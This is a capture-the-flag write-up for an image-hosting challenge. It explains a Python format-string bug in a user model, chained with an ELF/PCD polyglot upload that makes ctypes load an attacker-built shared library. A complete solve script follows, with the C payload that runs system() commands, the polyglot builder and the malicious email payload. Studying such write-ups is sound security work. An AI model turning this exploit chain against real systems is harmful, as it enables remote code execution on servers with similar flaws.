# Pixel Perfect (6 solves)

## Challenge Overview
Pixel Perfect is a modern image hosting platform built using FastAPI and SQLAlchemy. Users can upload images, create albums, and vote on content. The application performs image validation using the Pillow library and implements standard security headers. However, a subtle format string vulnerability in the user model's string representation, combined with the way images are stored and validated, allows for Remote Code Execution (RCE).

## Vulnerability Analysis

### 1. Python Format String Vulnerability
The core vulnerability resides in the `User` model, specifically within its `__str__` method:

```python
# app/models/user.py

def __str__(self) -> str:
    return f"User(id={self.id}, email={self.email}, admin={self.is_admin})".format(self=self)
```

The `email` field is user-controlled during registration. By injecting format string tokens into the email, an attacker can access arbitrary attributes of the `self` object (the `User` instance). This is a classic mistake where an f-string is passed to `.format()`, leading to double expansion.

### 2. Path Prediction and Object Graph Traversal
The application stores uploaded images in a predictable directory structure:
`/data/uploads/originals/{year}/{month}/{day}/{shortcode}.ext`

Since the application logs user activities, such as logins, it triggers the `User.__str__` method:
```python
# app/routers/auth.py
logger.info("User logged in: %s", user)
```

By crafting a specific email payload, we can traverse the SQLAlchemy object graph to reach the `sys.modules` dictionary and eventually the `ctypes` library.

### 3. Image Validation and Polyglots
The application validates uploaded files using `PIL.Image.open()` and `im.verify()`. Pillow supports a wide range of formats, including the Kodak PhotoCD (PCD) format. The PCD format is unique because its header (`PCD_`) is expected at offset 0x800 (2048 bytes).

This allows for the creation of a polyglot file that is:
*   A valid ELF Shared Object (.so): The ELF header starts at offset 0.
*   A valid PCD image: The PCD header starts at offset 0x800.

Pillow successfully opens and "verifies" such a file as a PCD image, while the operating system can load it as a shared library.

## Exploitation Strategy

1.  **Shared Object Creation**: Compile a C library with a constructor (`__attribute__((constructor))`) that executes the `readflag` binary and writes the output back to the uploaded image file.
2.  **Polyglot Generation**: Append the necessary PCD header and padding to the compiled .so file to make it a valid PCD image.
3.  **Upload**: Upload the polyglot file to the server. The server accepts it because it passes Pillow validation and has a .png extension.
4.  **RCE via Format String**: Register a new user with an email containing the format string payload. The payload uses `ctypes.cdll` to load the uploaded polyglot file:
    `{self.__mapper__.isa.__globals__[sys].modules[ctypes].cdll[/path/to/uploaded/image.png]}`
5.  **Trigger and Collect**: Log in as the new user. The logger will trigger the format string, loading the library and executing the payload. Finally, fetch the "raw" image file to retrieve the flag.

## Solve Script

```python
import io
import os
import sys
import shutil
import secrets
import tempfile
import requests
import subprocess

from PIL import Image
from bs4 import BeautifulSoup
from datetime import date


HOST = "localhost"
PORT = 80

BASE_URL = f"http://{HOST}:{PORT}"

PCD_HEADER_OFS = 0x800
PCD_HEADER = b"PCD_"
PCD_ORIENT_OFS = PCD_HEADER_OFS + 1538 # plugin peeks orientation byte s[1538]
BASE_OFS = 96 * 2048 # 0x30000: base (768x512) data start
W, H = 768, 512
CHUNK_LINES = 2
CHUNK_SIZE = 3 * W # 2304 bytes per 2 lines (Y0,W | Y1,W | C1,W/2 | C2,W/2)
NUM_CHUNKS = H // CHUNK_LINES
BASE_SIZE = NUM_CHUNKS * CHUNK_SIZE # 589,824 bytes
MIN_SIZE = BASE_OFS + BASE_SIZE

SHARED_OBJECT_C_TEMPLATE = r"""
#include <stdlib.h>

__attribute__((constructor))
static void init(void) {
    system("for f in /data/uploads/originals/*/*/*/*.png; do /readflag 'could you please give me the flag thank you so much' > \"$f\"; done");
}
"""


def write_pcd_header(path):
    with open(path, "r+b") as f:
        f.seek(PCD_HEADER_OFS)
        f.write(PCD_HEADER)
        f.seek(PCD_ORIENT_OFS)
        f.write(b"\x00") # do not trigger .rotate()


def build_exploit(code):
    with tempfile.TemporaryDirectory(prefix="shared_obj_") as tmpdir:
        output = build_shared_object(
            os.path.join(tmpdir, "polyglot.so"),
            source_code=code,
            source_name="polyglot",
        )
        with open(output, "rb") as f:
            return f.read()

def create_test_image(format_type="PNG", size=(4, 4)):
    img = Image.new('RGB', size, color='red')

    img.verify()

    buffer = io.BytesIO()
    img.save(buffer, format=format_type)
    buffer.seek(0)
    return buffer.getvalue()

def run(cmd, **kw):
    try:
        subprocess.check_call(cmd, **kw)
    except subprocess.CalledProcessError as e:
        print(f"[!] Command failed: {' '.join(cmd)} -> {e}", file=sys.stderr)
        sys.exit(1)

def build_shared_object(
    out_path,
    source_code=SHARED_OBJECT_C_TEMPLATE,
    source_name="payload",
    cc=None,
    extra_cflags="",
    extra_ldflags="",
):
    if not out_path.endswith(".so"):
        out_path = out_path + ".so"

    if cc is None:
        cc = (os.environ.get("CC") or "cc").split()[0]

    cflags = ["-fPIC", "-O2", "-Wall", "-Wextra"]
    if extra_cflags.strip():
        cflags += extra_cflags.strip().split()

    ldflags = ["-shared"]
    if extra_ldflags.strip():
        ldflags += extra_ldflags.strip().split()

    tmpdir = tempfile.mkdtemp(prefix="shared_obj_")
    try:
        src = os.path.join(tmpdir, f"{source_name}.c")
        with open(src, "w") as f:
            f.write(source_code)
        obj = os.path.join(tmpdir, f"{source_name}.o")
        run([cc, "-c", *cflags, src, "-o", obj])
        run([cc, *ldflags, obj, "-o", out_path])

        return out_path
    finally:
        shutil.rmtree(tmpdir)

def upload_lib(lib_path):
    requests.post(f"{BASE_URL}/convert", files=files, data=data)

def test_polyglot(output):
    try:
        return Image.open(output).tobytes(), "payload generation failed"
    except Exception as e:
        print(e)
        return False

def ensure_size(path):
    st = os.stat(path)
    if st.st_size < MIN_SIZE:
        with open(path, "ab") as f:
            f.truncate(MIN_SIZE)

def gen_polyglot():
    output = build_shared_object("exploit.so")
    ensure_size(output)
    write_pcd_header(output)

    assert test_polyglot(output)

    return output

def register(s, email):
    random_thing = secrets.token_hex(4)

    data = {
        "username": random_thing,
        "email": email,
        "password": random_thing,
    }

    r = s.post(f"{BASE_URL}/register", data=data)

    return r, random_thing


def login(s, username):
    data = {
        "username": username,
        "password": username,
    }

    r = s.post(f"{BASE_URL}/login", data=data)

    return r


if __name__ == "__main__":
    s = requests.Session()

    print("[!] Generating polyglot PCD/SO...")
    out_path = gen_polyglot()

    with open(out_path, "rb") as f:
        pcd_payload = f.read()

    img_title = secrets.token_hex(8)

    payload_size = len(pcd_payload)
    print(f"[!] Uploading the exploit ({payload_size} bytes / {payload_size/1024:.2f} KB / {payload_size/1024/1024:.2f} MB)")

    assert "Image uploaded" in (text:=s.post(f"{BASE_URL}/upload", 
           data={"title": img_title, "visibility": "public"},
           files={"files": (f"{img_title}.png", pcd_payload, "image/png")}).text), f"Failed to upload PCD polyglot: {text}"
    
    soup = BeautifulSoup(text, "html.parser")
    input_element = soup.find_all("input")[0]
    value = input_element.get("value")
    shortcode = value.split("/")[-1] if value else None

    assert shortcode is not None, f"Shortcode not found: {text}"

    print(f"[!] Shortcode: {shortcode}")

    today = date.today()
    fmtstr_payload = f'"{{self.__mapper__.isa.__globals__[sys].modules[ctypes].cdll[/data/uploads/originals/{today.year}/{f"{today.month}".zfill(2)}/{f"{today.day}".zfill(2)}/{shortcode}.png]}}" <{secrets.token_hex(4)}@example.com>'

    print(f"[!] Trying to register with format string payload: {fmtstr_payload}")
    resp, username = register(s, fmtstr_payload)

    assert resp.ok, f"Failed to register: {resp.text}"

    print(f"[!] Triggering format string payload, logging in with username {username}...")
    resp = login(s, username)

    assert resp.ok, f"Failed to log in: {resp.text}"

    print("[!] Fetching the flag...")

    flag = s.get(f"{BASE_URL}/raw/{shortcode}").content.strip()
    if flag.startswith(b"TRX") and flag.endswith(b"}"):
        print(f"[!] FLAG: {flag.decode()}")
    else:
        raise RuntimeError("[X] Flag not found...")
```
